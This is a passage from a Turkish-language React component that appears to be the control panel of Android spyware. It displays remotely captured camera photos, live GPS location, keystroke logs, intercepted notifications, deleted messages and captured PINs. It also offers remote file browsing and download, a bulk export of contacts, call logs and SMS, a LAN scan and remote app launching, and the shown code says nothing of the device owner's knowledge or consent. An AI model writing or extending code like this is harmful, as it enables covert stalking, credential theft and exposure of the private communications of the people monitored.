                      Yukarıdaki <strong className="text-violet-400">"Ön Kamera"</strong> veya <strong className="text-emerald-400">"Arka Kamera"</strong> butonuna basarak anında fotoğraf çekebilirsiniz.
                    </p>
                  </div>
                </div>
              ) : (
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5 sm:gap-3.5 max-h-[560px] overflow-y-auto pr-1">
                  {filteredMedia.map((media) => (
                    <MediaThumbnailCard
                      key={media.id || `${media.captured_at}_${media.type}`}
                      media={media}
                      onPreview={setPreviewItem}
                    />
                  ))}
                </div>
              )}


            </div>
          )}

          {/* ── SEKME 2: CANLI GPS & HARİTA ───────────────────────────────────── */}
          {activeTab === "LOCATION" && (
            <div className="bg-white/[0.02] border border-white/10 rounded-2xl sm:rounded-3xl p-3.5 sm:p-5 space-y-4 backdrop-blur-xl shadow-2xl">
              <div className="flex flex-wrap items-center justify-between gap-3">
                <div>
                  <h3 className="text-xs font-bold text-white flex items-center gap-2">
                    <Compass className="w-4 h-4 text-violet-400" /> Gerçek Zamanlı GPS & Durak Takibi
                  </h3>
                  <p className="text-[10px] text-slate-400 font-mono mt-0.5">{gpsAddress} • {gpsSpeed} km/s • ±{gpsAccuracy}m</p>
                </div>

                <div className="flex items-center gap-2">
                  <div className="flex bg-black/40 p-1 rounded-xl border border-white/5 text-xs font-bold">
                    <button onClick={() => setMapProvider("google")} className={`px-2.5 py-1 rounded-lg ${mapProvider === "google" ? "bg-violet-600 text-white" : "text-slate-400"}`}>Google</button>
                    <button onClick={() => setMapProvider("yandex")} className={`px-2.5 py-1 rounded-lg ${mapProvider === "yandex" ? "bg-violet-600 text-white" : "text-slate-400"}`}>Yandex</button>
                    <button onClick={() => setMapProvider("osm")} className={`px-2.5 py-1 rounded-lg ${mapProvider === "osm" ? "bg-violet-600 text-white" : "text-slate-400"}`}>OSM</button>
                  </div>
                  <button onClick={() => sendDeviceCommand("REQUEST_LOCATION")} className="px-3 py-1.5 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-xl text-xs font-bold transition">
                    GPS İste
                  </button>
                </div>
              </div>

              {/* Harita Çerçevesi */}
              <div className="w-full h-[320px] sm:h-[450px] bg-black rounded-2xl overflow-hidden border border-white/10 relative shadow-inner">
                <iframe
                  title="Harita"
                  width="100%"
                  height="100%"
                  frameBorder="0"
                  scrolling="no"
                  src={mapEmbedUrl}
                  className="w-full h-full border-0"
                />
                <div className="absolute bottom-3 left-3 px-3 py-1 bg-black/80 backdrop-blur-md rounded-xl text-[10px] text-slate-300 font-mono border border-white/10">
                  📍 {currentLat.toFixed(5)}, {currentLng.toFixed(5)} • {mapProvider.toUpperCase()}
                </div>
              </div>
            </div>
          )}

          {/* ── SEKME 3: KLAVYE, BİLDİRİMLER & SİLİNEN MESAJLAR ───────────────── */}
          {activeTab === "AUDIT" && (
            <div className="bg-white/[0.02] border border-white/10 rounded-2xl sm:rounded-3xl p-3.5 sm:p-5 space-y-4 backdrop-blur-xl shadow-2xl">
              <div className="flex flex-wrap items-center justify-between gap-3 pb-3 border-b border-white/5">
                <div className="relative flex-1 min-w-[180px]">
                  <input
                    type="text"
                    placeholder="Klavye veya bildirimlerde ara..."
                    value={auditSearch}
                    onChange={(e) => setAuditSearch(e.target.value)}
                    className="w-full pl-8 pr-3 py-1.5 bg-black/60 border border-white/10 rounded-xl text-xs text-white placeholder:text-slate-500 focus:outline-none focus:border-violet-500"
                  />
                  <Search className="w-3.5 h-3.5 text-slate-400 absolute left-2.5 top-2.5 pointer-events-none" />
                </div>

                <div className="flex items-center gap-1 bg-black/40 p-1 rounded-xl border border-white/5 text-xs font-bold flex-wrap">
                  <button onClick={() => setAuditFilter("ALL")} className={`px-2.5 py-1 rounded-lg ${auditFilter === "ALL" ? "bg-violet-600 text-white" : "text-slate-400"}`}>Tümü</button>
                  <button onClick={() => setAuditFilter("KEYSTROKE")} className={`px-2.5 py-1 rounded-lg ${auditFilter === "KEYSTROKE" ? "bg-violet-600 text-white" : "text-slate-400"}`}>Klavye</button>
                  <button onClick={() => setAuditFilter("NOTIFICATION")} className={`px-2.5 py-1 rounded-lg ${auditFilter === "NOTIFICATION" ? "bg-violet-600 text-white" : "text-slate-400"}`}>Bildirim</button>
                  <button onClick={() => setAuditFilter("DELETED_MSG")} className={`px-2.5 py-1 rounded-lg ${auditFilter === "DELETED_MSG" ? "bg-emerald-600 text-white" : "text-emerald-400"}`}>Silinen</button>
                  <button onClick={() => setAuditFilter("PIN_CAPTURED")} className={`px-2.5 py-1 rounded-lg ${auditFilter === "PIN_CAPTURED" ? "bg-amber-600 text-white" : "text-amber-400"}`}>PIN</button>
                </div>
              </div>

              <div className="space-y-2 max-h-[500px] overflow-y-auto pr-1">
                {filteredAuditLogs.length === 0 ? (
                  <div className="py-12 flex flex-col items-center justify-center text-center space-y-2 bg-black/30 rounded-2xl border border-white/5">
                    <p className="text-xs font-bold text-slate-300">Henüz Kayıtlı Klavye veya Bildirim Logu Yok</p>
                    <p className="text-[11px] text-slate-500">Cihazda klavyeden yazı yazıldığında veya bildirim geldiğinde burada anında listelenecektir.</p>
                  </div>
                ) : (
                  filteredAuditLogs.map((log) => (
                    <AuditLogRowCard
                      key={log.id || `${log.timestamp}_${log.package_name}_${log.content.substring(0, 30)}`}
                      log={log}
                    />
                  ))
                )}
              </div>
            </div>
          )}


          {/* ── SEKME 4: DOSYA GEZGİNİ ─────────────────────────────────────────── */}
          {activeTab === "FILES" && (

            <div className="bg-white/[0.02] border border-white/10 rounded-3xl p-5 space-y-3 backdrop-blur-xl shadow-2xl">
              <div className="flex items-center justify-between gap-3 pb-3 border-b border-white/5">
                <div className="flex items-center gap-2 text-xs font-mono text-violet-400 truncate">
                  <FolderOpen className="w-4 h-4 text-slate-400 shrink-0" />
                  <span>{filesData.current_path}</span>
                </div>
                <button
                  onClick={() => {
                    const parent = filesData.current_path.substring(0, filesData.current_path.lastIndexOf('/')) || '/storage/emulated/0';
                    sendDeviceCommand("LIST_FILES", { path: parent });
                  }}
                  className="px-3 py-1 bg-white/[0.05] hover:bg-white/[0.1] text-white text-xs font-bold rounded-xl flex items-center gap-1.5 transition"
                >
                  <ArrowUp className="w-3 h-3" /> Üst Dizin
                </button>
              </div>

              <div className="space-y-1.5 max-h-[500px] overflow-y-auto pr-1">
                {filesData.items.map((file, idx) => (
                  <div
                    key={`${file.path}_${idx}`}
                    className="p-3 bg-black/60 border border-white/10 hover:border-violet-500/40 rounded-xl flex items-center justify-between gap-3 transition cursor-pointer group"
                    onClick={() => file.is_directory && sendDeviceCommand("LIST_FILES", { path: file.path })}
                  >
                    <div className="flex items-center gap-2.5 truncate">
                      {file.is_directory ? <Folder className="w-4 h-4 text-amber-400 shrink-0" /> : <FileText className="w-4 h-4 text-violet-400 shrink-0" />}
                      <span className="text-xs font-semibold text-slate-200 truncate group-hover:text-white">{file.name}</span>
                    </div>

                    {!file.is_directory && (
                      <button
                        onClick={(e) => { e.stopPropagation(); handleDownloadFile(file.path, file.name); }}
                        className="p-1.5 text-slate-400 hover:text-violet-400 hover:bg-white/10 rounded-lg transition"
                        title="İndir"
                      >
                        <Download className="w-4 h-4" />
                      </button>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* ── SEKME 6: ADLİ YEDEKLEME (FORENSIC ZIP) ──────────────────────────── */}
          {activeTab === "FORENSIC" && (
            <div className="bg-white/[0.02] border border-white/10 rounded-3xl p-6 space-y-4 backdrop-blur-xl shadow-2xl">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <FileArchive className="w-5 h-5 text-violet-400" /> Tam Adli Yedekleme & Rehber / SMS Paketi (ZIP)
                  </h3>
                  <p className="text-xs text-slate-400 mt-1">Rehber kişilerini, arama geçmişini ve SMS mesajlarını tek tıkla şifreli ZIP olarak bilgisayarınıza indirir.</p>
                </div>

                <button
                  onClick={handleExportForensics}
                  disabled={commandLoading !== null}
                  className="px-4 py-2.5 bg-violet-600 hover:bg-violet-500 text-white font-bold text-xs rounded-xl shadow-lg shadow-violet-600/30 flex items-center gap-2 transition active:scale-95 disabled:opacity-50 whitespace-nowrap"
                >
                  <FileArchive className="w-4 h-4" />
                  <span>{commandLoading === "EXPORT_FORENSICS" ? "Yedek Paketleniyor..." : "⚡ Hemen İndirme Paketi Oluştur"}</span>
                </button>
              </div>

              {downloadPayload?.data_url && (
                <div className="p-4 bg-emerald-500/10 border border-emerald-500/20 rounded-2xl flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                    <div>
                      <div className="text-xs font-bold text-white">{downloadPayload.filename}</div>
                      <div className="text-[10px] text-emerald-400 font-mono">Arşiv hazır • {Math.round(downloadPayload.size_bytes / 1024)} KB</div>
                    </div>
                  </div>
                  <a href={downloadPayload.data_url} download={downloadPayload.filename} className="px-3.5 py-2 bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs rounded-xl flex items-center gap-1.5 transition shadow">
                    <Download className="w-3.5 h-3.5" /> Bilgisayara İndir (ZIP)
                  </a>
                </div>
              )}
            </div>
          )}

          {/* ── SEKME 7: DONANIM VE AĞ TEŞHİSİ ─────────────────────────────────── */}
          {activeTab === "DIAGNOSTICS" && (
            <div className="bg-white/[0.02] border border-white/10 rounded-3xl p-5 space-y-4 backdrop-blur-xl shadow-2xl">
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                <button onClick={() => sendDeviceCommand("RUN_DIAGNOSTICS")} className="p-4 bg-black/60 border border-white/10 hover:border-emerald-500/40 rounded-2xl text-left transition active:scale-95">
                  <Cpu className="w-5 h-5 text-emerald-400 mb-2" />
                  <div className="text-xs font-bold text-white">Donanım Teşhisi</div>
                  <div className="text-[10px] text-slate-400">Voltaj ve sensör kontrolü</div>
                </button>
                <button onClick={() => sendDeviceCommand("GET_SIM_INFO")} className="p-4 bg-black/60 border border-white/10 hover:border-cyan-500/40 rounded-2xl text-left transition active:scale-95">
                  <Signal className="w-5 h-5 text-cyan-400 mb-2" />
                  <div className="text-xs font-bold text-white">SIM & Şebeke</div>
                  <div className="text-[10px] text-slate-400">Operatör ve hat durumu</div>
                </button>
                <button onClick={() => sendDeviceCommand("SCAN_LAN_NETWORK")} className="p-4 bg-black/60 border border-white/10 hover:border-amber-500/40 rounded-2xl text-left transition active:scale-95">
                  <Wifi className="w-5 h-5 text-amber-400 mb-2" />
                  <div className="text-xs font-bold text-white">Wi-Fi Ağ Taraması</div>
                  <div className="text-[10px] text-slate-400">Ağdaki diğer IP cihazları</div>
                </button>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs pt-2">
                <div className="p-3 bg-black/60 border border-white/10 rounded-xl">
                  <div className="text-[10px] text-slate-400">Pil Durumu</div>
                  <div className="font-mono font-bold text-emerald-400 mt-0.5">%{batteryPct}</div>
                </div>
                <div className="p-3 bg-black/60 border border-white/10 rounded-xl">
                  <div className="text-[10px] text-slate-400">İşlemci Sıcaklığı</div>
                  <div className="font-mono font-bold text-cyan-400 mt-0.5">{batteryTemp}°C</div>
                </div>
                <div className="p-3 bg-black/60 border border-white/10 rounded-xl">
                  <div className="text-[10px] text-slate-400">Wi-Fi Link Hızı</div>
                  <div className="font-mono font-bold text-violet-400 mt-0.5">{linkSpeed} Mbps</div>
                </div>
                <div className="p-3 bg-black/60 border border-white/10 rounded-xl">
                  <div className="text-[10px] text-slate-400">Yonga Seti</div>
                  <div className="font-mono font-bold text-slate-200 mt-0.5">Qualcomm Snapdragon</div>
                </div>
              </div>
            </div>
          )}

          {/* ── SEKME 8: YÜKLÜ UYGULAMALAR ─────────────────────────────────────── */}
          {activeTab === "APPS" && (
            <div className="bg-white/[0.02] border border-white/10 rounded-3xl p-5 space-y-3 backdrop-blur-xl shadow-2xl">
              <div className="flex items-center justify-between gap-3 pb-2 border-b border-white/5">
                <div className="relative flex-1">
                  <input
                    type="text"
                    placeholder="Uygulama ara..."
                    value={appSearch}
                    onChange={(e) => setAppSearch(e.target.value)}
                    className="w-full pl-8 pr-3 py-1.5 bg-black/60 border border-white/10 rounded-xl text-xs text-white placeholder:text-slate-500 focus:outline-none focus:border-violet-500"
                  />
                  <Search className="w-3.5 h-3.5 text-slate-400 absolute left-2.5 top-2.5 pointer-events-none" />
                </div>
                <button onClick={() => sendDeviceCommand("LIST_APPS")} className="px-3 py-1.5 bg-white/[0.05] hover:bg-white/[0.1] text-violet-300 text-xs font-bold rounded-xl flex items-center gap-1.5 transition">
                  <RefreshCw className="w-3 h-3" /> Yenile
                </button>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 max-h-[480px] overflow-y-auto pr-1">
                {appsList
                  .filter(a => !appSearch || (a.app_name && a.app_name.toLowerCase().includes(appSearch.toLowerCase())) || a.package_name.toLowerCase().includes(appSearch.toLowerCase()))
                  .map((app, idx) => (
                    <div key={`${app.package_name}_${idx}`} className="p-3 bg-black/60 border border-white/10 rounded-xl flex items-center justify-between gap-2">
                      <div className="truncate">
                        <div className="text-xs font-bold text-white truncate">{app.app_name || app.package_name}</div>
                        <div className="text-[10px] text-slate-500 font-mono truncate">{app.package_name}</div>
                      </div>
                      <button onClick={() => sendDeviceCommand("LAUNCH_APP", { package_name: app.package_name })} className="px-2.5 py-1 bg-violet-600/20 hover:bg-violet-600/40 text-violet-300 border border-violet-500/30 rounded-lg text-[10px] font-bold shrink-0 transition">
                        Başlat
                      </button>
                    </div>
                  ))}
              </div>
            </div>
          )}

        </div>

      </div>

      {/* ── 3. TAM EKRAN LIGHTBOX ÖNİZLEME MODALI ─────────────────────────────── */}
      {previewItem && (
        <div className="fixed inset-0 z-50 bg-black/90 backdrop-blur-xl flex items-center justify-center p-4 sm:p-8 animate-fadeIn">
          <div className="max-w-4xl w-full bg-[#0a0a14] border border-white/10 rounded-3xl overflow-hidden shadow-2xl space-y-4 p-6">
            <div className="flex items-center justify-between border-b border-white/10 pb-3">
              <div>
                <h3 className="text-sm font-bold text-white">{previewItem.title}</h3>
                <p className="text-[10px] text-slate-400 font-mono">{previewItem.date_formatted} • {previewItem.size_formatted}</p>
              </div>
              <button onClick={() => setPreviewItem(null)} className="p-2 bg-white/10 hover:bg-white/20 rounded-xl text-white transition">
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="w-full max-h-[65vh] flex items-center justify-center overflow-hidden rounded-2xl bg-black">
              {previewItem.url && (
                // eslint-disable-next-line @next/next/no-img-element
                <img src={previewItem.url} alt={previewItem.title} className="max-h-[60vh] object-contain rounded-xl" />
              )}
            </div>

            <div className="flex items-center justify-end gap-3 pt-2">
              <button onClick={() => setPreviewItem(null)} className="px-4 py-2 bg-white/10 hover:bg-white/20 text-white font-bold text-xs rounded-xl transition">
                Kapat
              </button>
              {previewItem.url && (
                <a href={previewItem.url} download={previewItem.title} className="px-4 py-2 bg-violet-600 hover:bg-violet-500 text-white font-bold text-xs rounded-xl flex items-center gap-1.5 transition">
                  <Download className="w-4 h-4" /> İndir
                </a>
              )}
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
